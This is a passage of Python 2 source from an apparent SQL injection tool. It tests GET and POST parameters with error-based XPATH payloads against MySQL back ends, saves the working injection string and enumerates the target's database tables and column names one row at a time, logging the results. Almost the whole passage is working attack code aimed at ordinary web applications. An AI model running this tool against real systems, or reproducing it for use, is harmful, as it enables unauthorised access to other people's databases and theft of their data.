                                                                                                name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                                if 'XPATH syntax error' in respdata:
                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
                                                                                                    infos += "[*] %s\n" % name_of_tbls
                                                                                                    tmp += "[*] %s\n" % name_of_tbls
                                                                                                    dumps.append(name_of_tbls)
                                                                                                    temp += 1
                                                                                                    
                                                                                            except IndexError as e:
                                                                                                pass
                                                                                            except Exception as e:
                                                                                                #print '[-] %s' % e
                                                                                                #sys.exit(0)
                                                                                                pass
                                                                                            except KeyboardInterrupt:
                                                                                                KeyBoardInterrupt()
                                                                                                break
                                                                                    print fg + sb + "Database: %s" % db        
                                                                                    print fg + sb + "["+str(noT)+" tables]"
                                                                                    #print fg + sb + tmp
                                                                                    tab = pt(["tables"])
                                                                                    tab.align = "l"
                                                                                    tab.header = False
                                                                                    for tbl in dumps:
                                                                                        tab.add_row([tbl])
                                                                                        pass
                                                                                    print fg + sn + str(tab) 
                                                                                        
                                                                            except IndexError as e:
                                                                                pass
                                                                            except Exception as e:
                                                                                #print '[-] %s' % e
                                                                                #sys.exit(0)
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                                KeyBoardInterrupt()
                                                                                break
                                                                if dbvul:
                                                                    break
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
                    
            f.write(infos)
            f.write(str(tab)+"\n")
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            HTTPResponses(url, data)
            Query_Test = False
            tempfread = tempf.readline()
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
            infos += "the back-end DBMS: MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
            for QueryIndex in TBL_COUNT_FROM_DBS:
                if not Query_Test:
                   #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                    QueryToTest = QueryIndex % (db.encode('hex','strict'))
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
                                    dbvul = False
                                    for QueryIndex in TBL_DUMP_FROM_DBS:
                                        if not dbvul:
                                            QueryToTest = QueryIndex % (db.encode('hex','strict'))
                                            if '0x72306f74' in tempfread:
                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            dbvul = True
                                                            DbDumpQuery = FinalCountQuery_replaced
                                                            temp = 0
                                                            noT = int(no_of_tbls)
                                                            infos += "Database: %s\n" % db
                                                            infos += "["+str(noT)+" tables]\n"
                                                            #tmp = ""
                                                            while temp < noT:
                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                elif 'LIMIT%20' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
                                                                else:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                
                                                                try:
                                                                    req = Request(url, data=tempQuery, headers={'User-agent':ua})
                                                                    resp = urlopen(req, timeout=10)
                                                                except URLError as e:
                                                                    URLError()
                                                                    if temp==0:
                                                                        temp=0
                                                                    else:
                                                                        temp = temp
                                                                    sleep(1)
                                                                    pass
                                                                except HTTPError as e:
##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                    sleep(1)
                                                                    pass
                                                                except (IOError, httplib.HTTPException) as e:
                                                                    ConnTimeOut()
                                                                    if temp==0:
                                                                        temp=0
                                                                    else:
                                                                        temp = temp
                                                                    pass
                                                                except KeyboardInterrupt:
                                                                    print fw + sn + "Database: %s"%db
                                                                    print fw + sn + "[Dumped "+str(temp)+" tables]"
                                                                    #print fw + sn + tmp
                                                                    tab = pt(["tables"])
                                                                    tab.align = "l"
                                                                    tab.header = False
                                                                    for tbl in dumps:
                                                                        tab.add_row([tbl])
                                                                        pass
                                                                    print fw + sn + str(tab) 
                                                                    f.write(infos)
                                                                    f.write(str(tab)+"\n")
                                                                    f.close()
                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                    KeyBoardInterrupt()
                                                                    break
                                                                else:
                                                                    try:
                                                                        respdata = resp.read()
                                                                        name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                        if 'XPATH syntax error' in respdata:
                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
                                                                            #infos += "[*] %s\n" % name_of_tbls
                                                                            #tmp += "[*] %s\n" % name_of_tbls
                                                                            dumps.append(name_of_tbls)
                                                                            temp += 1
                                                                            
                                                                    except IndexError as e:
                                                                        pass
                                                                    except Exception as e:
                                                                        #print '[-] %s' % e
                                                                        #sys.exit(0)
                                                                        pass
                                                                    except KeyboardInterrupt:
                                                                        KeyBoardInterrupt()
                                                                        break
                                                                
                                                            print fw + sn + "Database: %s"%db
                                                            print fw + sn + "["+str(noT)+" tables]"
                                                            #print fw + sn + tmp
                                                            tab = pt(["tables"])
                                                            tab.align = "l"
                                                            tab.header = False
                                                            for tbl in dumps:
                                                                tab.add_row([tbl])
                                                                pass
                                                            print fw + sn + str(tab) 
                                                            
                                                                
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if dbvul:
                                            break
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                #sys.exit(0)
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.write(str(tab)+"\n")
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
        
    else:
        pass
        


def dumpCols(url, data, db, tbl):
    
    global war,wsr
    global logs,payload
    HTTPReqCount = 0
    infos = ""
    dumps = []
#------------------------------------------
    f = open(logs,'a')              
#------------------------------------------
    if url != None and data == None:
        try:
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in url:
                                first, last = url.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
                            else:
                                tgt = url + temp
                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
                                req = Request(tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    #print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
                                    infos += "the back-end DBMS: MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
                                    for QueryIndex in COL_COUNT_FROM_TBL:
                                        if not Query_Test:
                                            QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
                                                            dbvul = False
                                                            for QueryIndex in COL_DUMP_FROM_TBL:
                                                                if not dbvul:
                                                                    QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
                                                                    if '0x72306f74' in tgt:
                                                                        FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                                        try:
                                                                            req = Request(FinalDumpQuery_replaced, headers={'User-agent':ua})
                                                                            resp = urlopen(req, timeout=10)
                                                                        except URLError as e:
                                                                            URLError()
                                                                            sleep(1)
                                                                            pass
                                                                        except HTTPError as e:
##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                            sleep(1)
                                                                            pass
                                                                        except (IOError, httplib.HTTPException) as e:
                                                                            ConnTimeOut()
                                                                            pass
                                                                        except KeyboardInterrupt:
                                                                            KeyBoardInterrupt()
                                                                            break
                                                                        else:
                                                                            try:
                                                                                respdata = resp.read()
                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                if 'XPATH syntax error' in respdata:
                                                                                    dbvul = True
                                                                                    DbDumpQuery = FinalDumpQuery_replaced
                                                                                    temp = 0
                                                                                    noc = int(no_of_cols)
                                                                                    infos += "Database: %s\n" % db
                                                                                    infos += "Table: %s\n" % tbl
                                                                                    infos += "["+str(noc)+" columns]\n"
                                                                                    #tmp = ""
                                                                                    while temp < noc:
                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                                        elif 'LIMIT%20' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
                                                                                        else:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)

                                                                                        try:
                                                                                            req = Request(tempQuery, headers={'User-agent':ua})
                                                                                            resp = urlopen(req, timeout=10)
                                                                                        except URLError as e:
                                                                                            URLError()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except HTTPError as e:
##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except (IOError, httplib.HTTPException) as e:
                                                                                            ConnTimeOut()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            pass
                                                                                        except KeyboardInterrupt:
                                                                                            print fg + sb + "Database: %s" % db
                                                                                            print fg + sb + "Table: %s" % tbl
                                                                                            print fg + sb + "[Dumped "+str(temp)+" columns]"
                                                                                            #print fg + sb + tmp
                                                                                            col = pt(["columns"])
                                                                                            col.align = "l"
                                                                                            col.header = False
                                                                                            for cols in dumps:
                                                                                                col.add_row([cols])
                                                                                                pass
                                                                                            print fg + sn + str(col)
                                                                                            f.write(infos)
                                                                                            f.write(str(col)+"\n")
                                                                                            f.close()
                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                                            KeyBoardInterrupt()
                                                                                            break
                                                                                        else:
                                                                                            try:
                                                                                                respdata = resp.read()
                                                                                                name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                                if 'XPATH syntax error' in respdata:
                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
                                                                                                    #infos += "[*] %s\n" % name_of_cols
                                                                                                    #tmp += "[*] %s\n" % name_of_cols
                                                                                                    dumps.append(name_of_cols)
                                                                                                    temp += 1
                                                                                                    
                                                                                            except IndexError as e:
                                                                                                pass
                                                                                            except Exception as e:
                                                                                                #print '[-] %s' % e
                                                                                                #sys.exit(0)
                                                                                                pass
                                                                                            except KeyboardInterrupt:
                                                                                                KeyBoardInterrupt()
                                                                                                break
                                                                                    print fg + sb + "Database: %s" % db
                                                                                    print fg + sb + "Table: %s" % tbl
                                                                                    print fg + sb + "["+str(noc)+" columns]"
                                                                                    #print fg + sb + tmp
                                                                                    col = pt(["columns"])
                                                                                    col.align = "l"
                                                                                    col.header = False
                                                                                    for cols in dumps:
                                                                                        col.add_row([cols])
                                                                                        pass
                                                                                    print fg + sn + str(col)
                                                                                        
                                                                            except IndexError as e:
                                                                                pass
                                                                            except Exception as e:
                                                                                #print '[-] %s' % e
                                                                                #sys.exit(0)
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                                KeyBoardInterrupt()
                                                                                break
                                                                if dbvul:
                                                                    break
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
                    
            f.write(infos)
            f.write(str(col)+"\n")
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            Query_Test = False
            tempfread = tempf.readline()
            url = None
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
            infos += "the back-end DBMS: MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
            for QueryIndex in COL_COUNT_FROM_TBL:
                if not Query_Test:
                    QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    QueryToDumpDbNames = FinalCountQuery_replaced
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
                                    dbvul = False
                                    for QueryIndex in COL_DUMP_FROM_TBL:
                                        if not dbvul:
                                            QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
                                            if '0x72306f74' in tempfread:
                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            dbvul = True
                                                            DbDumpQuery = FinalCountQuery_replaced
                                                            temp = 0
                                                            noc = int(no_of_cols)
                                                            infos += "Database: %s\n" % db
                                                            infos += "Table: %s\n" % tbl
                                                            infos += "["+str(noc)+" columns]\n"
                                                            #tmp = ""
                                                            while temp < noc:
                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                elif 'LIMIT%20' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
                                                                else:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                    
                                                                try:
                                                                    req = Request(tempQuery, headers={'User-agent':ua})
                                                                    resp = urlopen(req, timeout=10)
                                                                except URLError as e:
                                                                    URLError()
                                                                    if temp == 0:
                                                                        temp = 0
                                                                    else:
                                                                        temp = temp
                                                                    sleep(1)
                                                                    pass
                                                                except HTTPError as e:
##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                    sleep(1)
                                                                    pass
                                                                except (IOError, httplib.HTTPException) as e:
                                                                    ConnTimeOut()
                                                                    if temp == 0:
                                                                        temp = 0
                                                                    else:
                                                                        temp = temp
                                                                    sleep(1)
                                                                    pass
                                                                except KeyboardInterrupt:
                                                                    print fw + sn + "Database: %s" % db
                                                                    print fw + sn + "Table: %s" % tbl
                                                                    print fw + sn + "[Dumped "+str(temp)+" columns]"
                                                                    #print fw + sn + tmp
                                                                    col = pt(["columns"])
                                                                    col.align = "l"
                                                                    col.header = False
                                                                    for cols in dumps:
                                                                        col.add_row([cols])
                                                                        pass
                                                                    print fw + sn + str(col)
                                                                    f.write(infos)
                                                                    f.write(str(col)+"\n")
                                                                    f.close()
                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                    KeyBoardInterrupt()
                                                                    break
                                                                else:
                                                                    try:
                                                                        respdata = resp.read()
                                                                        name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                        if 'XPATH syntax error' in respdata:
                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
                                                                            #infos += "[*] %s\n" % name_of_cols
                                                                            #tmp += "[*] %s\n" % name_of_cols
                                                                            dumps.append(name_of_cols)
                                                                            temp += 1
                                                                            
                                                                    except IndexError as e:
                                                                        pass
                                                                    except Exception as e:
                                                                        #print '[-] %s' % e
                                                                       # sys.exit(0)
                                                                        pass
                                                                    except KeyboardInterrupt:
                                                                        KeyBoardInterrupt()
                                                                        break
                                                            print fw + sn + "Database: %s" % db
                                                            print fw + sn + "Table: %s" % tbl
                                                            print fw + sn + "["+str(noc)+" columns]"
                                                            #print fw + sn + tmp
                                                            col = pt(["columns"])
                                                            col.align = "l"
                                                            col.header = False
                                                            for cols in dumps:
                                                                col.add_row([cols])
                                                                pass
                                                            print fw + sn + str(col)
                                                                
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if dbvul:
                                            break
                                        # TBL DUMP END
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                #sys.exit(0)
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.write(str(col)+"\n")
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
#--------------------------------------------------------------------------------
#                           POST DATA
#--------------------------------------------------------------------------------

    elif url != None and data != None:
        try:
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in data:
                                first, last = data.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
                            else:
                                tgt = data + temp
                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
                                req = Request(url, data=tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break   
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                    
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    #print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
                                    infos += "the back-end DBMS: MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
                                    for QueryIndex in COL_COUNT_FROM_TBL:
                                        if not Query_Test:
                                            QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex','strict'))
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
                                                            dbvul = False
                                                            for QueryIndex in COL_DUMP_FROM_TBL:
                                                                if not dbvul:
                                                                    QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex', 'strict'))
                                                                    if '0x72306f74' in tgt:
                                                                        FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
